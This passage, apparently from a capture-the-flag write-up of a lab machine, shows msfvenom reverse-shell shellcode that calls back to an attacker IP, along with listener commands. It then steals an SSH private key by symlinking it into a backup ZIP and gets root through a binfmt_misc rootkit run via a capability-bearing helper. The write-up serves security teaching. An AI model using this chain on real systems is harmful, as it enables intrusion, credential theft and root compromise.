Alright, we have the offset, the library bases, the library paths, and the exploit arguments. Now all we need is some shell code. We can execute `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.116 LPORT=55455 -f py` to get some shellcode from Metasploit that will spawn a reverse shell:

```python
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48"
buf += b"\x97\x48\xb9\x02\x00\xd8\x9f\x0a\x0a\x0e\x74\x51\x48"
buf += b"\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e"
buf += b"\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58"
buf += b"\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48"
buf += b"\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"
```

Finally, we write [exploit.py](exploit.py) to encapsulate all these ideas and actually perform the attack. Run a listener with pwncat by running `pwncat-cs -lp 55455` (or use netcat with `nc -nvlp 55455`). This gives us a shell as the `www-data` user.

## Lateral Movement

We start in `/var/www`, which has a few strange dated ZIP files that vary by 1 minute in creation date:

```
(remote) www-data@retired:/var/www$ ls -la
total 1512
drwxrwsrwx  3 www-data www-data   4096 Aug  5 05:10 .
drwxr-xr-x 12 root     root       4096 Mar 11 14:36 ..
-rw-r--r--  1 dev      www-data 505153 Aug  5 05:08 2022-08-05_05-08-01-html.zip
-rw-r--r--  1 dev      www-data 505153 Aug  5 05:09 2022-08-05_05-09-05-html.zip
-rw-r--r--  1 dev      www-data 505153 Aug  5 05:10 2022-08-05_05-10-05-html.zip
drwxrwsrwx  5 www-data www-data   4096 Mar 11 14:36 html
-rw-r--r--  1 www-data www-data  12288 Aug  5 05:07 license.sqlite
```

Running `ls` again shows new files, so it looks like they get recreated every minute. Let's run [pspy](https://github.com/DominicBreuker/pspy) to see what is happening. You can upload this tool easily with `pwncat`'s built-in `upload` command. This doesn't reveal anything.

We run [LinPEAS](https://github.com/carlospolop/PEASS-ng/blob/master/linPEAS/README.md) and look for anything that runs each minute. We see this output:

```
╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers
NEXT                        LEFT           LAST                        PASSED               UNIT                         ACTIVATES
Fri 2022-08-05 05:21:00 UTC 33s left       Fri 2022-08-05 05:20:01 UTC 24s ago              website_backup.timer         website_backup.service
```

We run `find / -name website_backup.service 2>/dev/null` to find the file at `/etc/systemd/system/website_backup.service`. Looking at the file, we see that it runs `/usr/bin/webbackup`:

```
(remote) www-data@retired:/tmp$ cat /etc/systemd/system/website_backup.service
[Unit]
Description=Backup and rotate website

[Service]
User=dev
Group=www-data
ExecStart=/usr/bin/webbackup

[Install]
WantedBy=multi-user.target
```

```bash
(remote) www-data@retired:/tmp$ cat /usr/bin/webbackup
#!/bin/bash
set -euf -o pipefail

cd /var/www/

SRC=/var/www/html
DST="/var/www/$(date +%Y-%m-%d_%H-%M-%S)-html.zip"

/usr/bin/rm --force -- "$DST"
/usr/bin/zip --recurse-paths "$DST" "$SRC"

KEEP=10
/usr/bin/find /var/www/ -maxdepth 1 -name '*.zip' -print0 \
    | sort --zero-terminated --numeric-sort --reverse \
    | while IFS= read -r -d '' backup; do
        if [ "$KEEP" -le 0 ]; then
            /usr/bin/rm --force -- "$backup"
        fi
        KEEP="$((KEEP-1))"
    done
```

This script runs as the `dev` user and it creates a ZIP file from `/var/www/html` every minute. We can symlink `dev`'s SSH private key into a ZIP file by running `cd /var/www/html && ln -s /home/dev/.ssh/id_rsa id_rsa`. Copy the resulting ZIP file to `/tmp` by running `cp 2022-08-05_05-28-05-html.zip /tmp` and unzip with with `unzip 2022-08-05_05-28-05-html.zip`:

```
Archive:  2022-08-05_05-28-05-html.zip
   creating: var/www/html/
   creating: var/www/html/js/
  inflating: var/www/html/js/scripts.js
  inflating: var/www/html/activate_license.php
   creating: var/www/html/assets/
  inflating: var/www/html/assets/favicon.ico
   creating: var/www/html/assets/img/
  inflating: var/www/html/assets/img/close-icon.svg
  inflating: var/www/html/assets/img/navbar-logo.svg
   creating: var/www/html/assets/img/about/
  inflating: var/www/html/assets/img/about/2.jpg
  inflating: var/www/html/assets/img/about/4.jpg
  inflating: var/www/html/assets/img/about/3.jpg
  inflating: var/www/html/assets/img/about/1.jpg
   creating: var/www/html/assets/img/logos/
  inflating: var/www/html/assets/img/logos/facebook.svg
  inflating: var/www/html/assets/img/logos/microsoft.svg
  inflating: var/www/html/assets/img/logos/google.svg
  inflating: var/www/html/assets/img/logos/ibm.svg
   creating: var/www/html/assets/img/team/
  inflating: var/www/html/assets/img/team/2.jpg
  inflating: var/www/html/assets/img/team/3.jpg
  inflating: var/www/html/assets/img/team/1.jpg
  inflating: var/www/html/assets/img/header-bg.jpg
  inflating: var/www/html/beta.html
  inflating: var/www/html/default.html
  inflating: var/www/html/index.php
  inflating: var/www/html/id_rsa
   creating: var/www/html/css/
  inflating: var/www/html/css/styles.css
```

Now, just download `/tmp/var/www/html/id_rsa`. We can now connect as `dev` by running `ssh dev@10.10.11.154 -i id_rsa` (or use `pwncat-cs`). Finally, get the `user.txt` flag with `cat ~/user.txt`.

## Privilege Escalation

In `dev`'s home folder we get the source code for the `activate_license` program, which is nice: [activate_license.zip](activate_license.zip).

We look through the `/home/dev/emuemu/` directory:

```
(remote) dev@retired:/home/dev$ ls -la emuemu/
total 68
drwx------ 3 dev dev  4096 Mar 11 14:36 .
drwx------ 6 dev dev  4096 Aug  5 05:33 ..
-rw------- 1 dev dev   673 Oct 13  2021 Makefile
-rw------- 1 dev dev   228 Oct 13  2021 README.md
-rw------- 1 dev dev 16608 Oct 13  2021 emuemu
-rw------- 1 dev dev   168 Oct 13  2021 emuemu.c
-rw------- 1 dev dev 16864 Oct 13  2021 reg_helper
-rw------- 1 dev dev   502 Oct 13  2021 reg_helper.c
drwx------ 2 dev dev  4096 Mar 11 14:36 test

(remote) dev@retired:/home/dev$ cat emuemu/emuemu.c
#include <stdio.h>

/* currently this is only a dummy implementation doing nothing */

int main(void) {
    puts("EMUEMU is still under development.");
    return 1;
}

(remote) dev@retired:/home/dev$ ls -la emuemu/test/
total 12
drwx------ 2 dev dev 4096 Mar 11 14:36 .
drwx------ 3 dev dev 4096 Mar 11 14:36 ..
-rwxr-xr-x 1 dev dev   70 Oct 13  2021 examplerom

(remote) dev@retired:/home/dev$ cat emuemu/test/examplerom
7OSTRICHROM
this is a minimal rom with a valid file type signature
```

The actually interesting file is `emuemu/reg_helper.c`:

```c++
#define _GNU_SOURCE

#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

int main(void) {
    char cmd[512] = { 0 };

    read(STDIN_FILENO, cmd, sizeof(cmd)); cmd[-1] = 0;

    int fd = open("/proc/sys/fs/binfmt_misc/register", O_WRONLY);
    if (-1 == fd)
        perror("open");
    if (write(fd, cmd, strnlen(cmd,sizeof(cmd))) == -1)
        perror("write");
    if (close(fd) == -1)
        perror("close");

    return 0;
}
```

Searching for "/proc/sys/fs/binfmt_misc/register" finds [this StackOverflow answer](https://stackoverflow.com/a/68885059), which states that this file is "an interface to the kernel's mechanism for setting up binary formats."

Furthermore, the `/home/dev/emuemu/Makefile` contains some helpful information:

```Makefile
(remote) dev@retired:/home/dev/emuemu$ cat Makefile
CC := gcc
CFLAGS := -std=c99 -Wall -Werror -Wextra -Wpedantic -Wconversion -Wsign-conversion

SOURCES := $(wildcard *.c)
TARGETS := $(SOURCES:.c=)

.PHONY: install clean

install: $(TARGETS)
        @echo "[+] Installing program files"
        install --mode 0755 emuemu /usr/bin/
        mkdir --parent --mode 0755 /usr/lib/emuemu /usr/lib/binfmt.d
        install --mode 0750 --group dev reg_helper /usr/lib/emuemu/
        setcap cap_dac_override=ep /usr/lib/emuemu/reg_helper

        @echo "[+] Register OSTRICH ROMs for execution with EMUEMU"
        echo ':EMUEMU:M::\x13\x37OSTRICH\x00ROM\x00::/usr/bin/emuemu:' \
                | tee /usr/lib/binfmt.d/emuemu.conf \
                | /usr/lib/emuemu/reg_helper

clean:
        rm -f -- $(TARGETS)
```

The `reg_helper` file is also located at `/usr/lib/emuemu/reg_helper` and has the `cap_dac_override` capability. This means it can "bypass file read, write, and execute permission checks" ([source](https://man7.org/linux/man-pages/man7/capabilities.7.html)).

Searching for exploits involving `/proc/sys/fs/binfmt_misc/register` finds [toffan/binfmt_misc](https://github.com/toffan/binfmt_misc), which looks promising. We also find **these two amazing blog posts summarizing the issue we are about to exploit**:

* [What is SUID? Shadow SUID for Privilege Persistence: Part 1](https://www.sentinelone.com/blog/shadow-suid-for-privilege-persistence-part-1/)
* [SUID Linux: Shadow SUID for Privilege Persistence: Part 2](https://www.sentinelone.com/blog/shadow-suid-privilege-persistence-part-2/)

When we run a command on linux, "the kernel reads the first 128 characters of the file. It then iterates over the registered binary-format-handlers to determine which handler should be used. That way, when we execute a file that begins with a #! shebang, the kernel knows it is a script, and the binfmt_script handler is used to find the relevant interpreter (as indicated after the shebang). Similarly, when the file begins with x7fELF, the kernel knows it is a regular Linux binary, and the binfmt_elf handler is used to load the binary into the elf interpreter."

Within the `/proc/sys/fs/binfmt_misc` directory, we see an `EMUEMU` file. If we `cat` it, we get:

```
enabled
interpreter /usr/bin/emuemu
flags:
offset 0
magic 13374f53545249434800524f4d00
```

So, files begining with the magic bytes `13374f53545249434800524f4d00` will be executed by `/usr/bin/emuemu`. If we decode those bytes from hex we get `.7OSTRICH.ROM.`, which are the first few bytes of the example ROM file we found in `dev`'s home directory.

In order to use [toffan/binfmt_misc](https://github.com/toffan/binfmt_misc), we need to be able to write to `/proc/sys/fs/binfmt_misc/register`. We can do this because the `/usr/lib/emuemu/reg_helper` file has the aforementioned capability to bypass file write checks. The script will register a new interpreter with `binfmt_misc` linked to the magic bytes of a random SUID binary. That new interpreter will run `/bin/sh`. Thus, when that random SUID binary is executed, Linux will find it's magic bytes registered with `binfmt_misc` and execute our interpreter with the permissions of the file executed. Since the file executed is SUID, we will get a root shell.

A more simple example is registering an entry for Python files with the first few bytes of a python file. With that interpreter added to `binfmt_misc`, you could run Python files without shebang headers directly without using the `python` command. Now, if you made your Python script a SUID binary, ran `os.setuid(0);os.setgid(0)` within it, and executed it, it would run as `root` even though the Python interepreter is not SUID. That is what we are doing with the [toffan/binfmt_misc](https://github.com/toffan/binfmt_misc) script. When a SUID binary is executed, it will execute our interpreter as `root` and we can set its UID/GID to `root` and then spawn a shell.

We download the [exploit](https://github.com/toffan/binfmt_misc/blob/master/binfmt_rootkit) and modify it slightly. We remove the following two pieces of code that check if `/proc/sys/fs/binfmt_misc/register` is writeable, since it is not writeable:

```bash
function not_writeable()
{
	test ! -w "$mountpoint/register"
}
```

```bash
not_writeable && die "Error: $mountpoint/register is not writeable"
```

Finally, change `echo "$binfmt_line" > "$mountpoint"/register` to `echo "$binfmt_line" | /usr/lib/emuemu/reg_helper` so we write to the `reg_helper` file (which will write to `/proc/sys/fs/binfmt_misc/register`) instead of writing directly to `/proc/sys/fs/binfmt_misc/register`.

Running [binfmt_rootkit](binfmt_rootkit) (our modified exploit) will immediately spawn a root shell. Get the `root.txt` flag with `cat /root/root.txt`.
